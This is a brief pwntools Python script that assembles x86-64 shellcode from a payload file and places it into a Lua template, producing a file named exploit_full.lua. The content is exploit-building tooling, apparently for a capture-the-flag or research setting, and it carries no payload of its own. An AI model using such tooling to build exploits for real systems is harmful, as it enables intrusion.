#!/usr/bin/python3

from pwn import *
import sys

if len(sys.argv) > 1:
    payload_file = sys.argv[1]
else:
    payload_file = "payload.s"

context.update(arch="amd64", os="linux")

with open(payload_file, "r") as f:
    payload = f.read()

with open("template.lua", "r") as f:
    template = f.read()

payload_bytes = asm(payload)
print(payload_bytes)
print(payload_bytes.hex())

template = template.replace("SHELLCODE_HERE", str(payload_bytes)[2:-1])

with open("exploit_full.lua", "w") as f:
    f.write(template)